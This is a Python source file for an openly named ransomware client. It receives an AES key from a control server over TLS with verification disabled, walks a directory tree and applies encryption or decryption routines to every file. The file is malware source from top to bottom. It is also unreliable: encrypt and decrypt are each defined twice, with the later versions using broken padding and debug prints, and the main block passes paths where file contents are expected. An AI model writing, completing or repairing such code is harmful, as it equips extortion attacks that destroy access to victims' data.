import os
import socket
import ssl
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding

class RansomewareClient():
    def __init__(self,random_key) -> None:
        self.key = random_key
        self.iv = b"D\xbb\x03\xac\xb7\xb6\xad\x81\xdf\x86\xdag'\xf4\x00\xe6"
        self.backend = default_backend()

    def directory_walk(self,dirpath,action):   
        for dirpath,dirnames,filenames in os.walk(dirpath): 
            for filename in filenames:
                filepath = os.path.join(dirpath,filename)
                action(filepath)

    def encrypt(self, text: bytes):
        cipher = Cipher(algorithms.AES(self.key), modes.CBC(self.iv), backend=self.backend)
        encryptor = cipher.encryptor()
        
        # Proper PKCS7 padding (fixes your padding bug too)
        padder = padding.PKCS7(128).padder()
        padded_data = padder.update(text) + padder.finalize()
        
        ciphertext = encryptor.update(padded_data) + encryptor.finalize()
        return ciphertext

    def decrypt(self, text: bytes):
        cipher = Cipher(algorithms.AES(self.key), modes.CBC(self.iv), backend=self.backend)
        decryptor = cipher.decryptor()
        
        decrypted_padded = decryptor.update(text) + decryptor.finalize()
        
        # Remove padding
        unpadder = padding.PKCS7(128).unpadder()
        plaintext = unpadder.update(decrypted_padded) + unpadder.finalize()
        return plaintext

    def read_file(self, path):
        with open(path, "rb") as file:
            plaintext = file.read()
        return plaintext

    def write_file(self, path, content):
        with open(path, "wb") as encrypted_file:
             encrypted_file.write(content)


    def encrypt(self,text):
        cipher = Cipher(algorithms.AES(self.key),modes.CBC(self.iv),backend=self.backend)
        encryptor = cipher.encryptor()
        print("reached here")
        padded = text.encode() + b' ' * (16 - len(text) % 16)
        print("and here")
        Ciphertext = encryptor.update(padded) + encryptor.finalize()
        return Ciphertext
    
    def decrypt(self,text):
        cipher = Cipher(algorithms.AES(self.key), modes.CBC(self.iv),backend=self.backend)
        decryptor = cipher.decryptor()
        return decryptor.update(text)+decryptor.finalize()

 

if __name__ == "__main__":
     sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     context = ssl._create_unverified_context()
     ssl_sock = context.wrap_socket(sock, server_hostname="127.0.0.1")
     ssl_sock.connect(("127.0.0.1",8080))
     random_key = ssl_sock.recv(1024)
     Ransome = RansomewareClient(random_key)
     Ransome.directory_walk("C:/Users/Gaming PC/Downloads/test/dddddd", action=Ransome.decrypt)
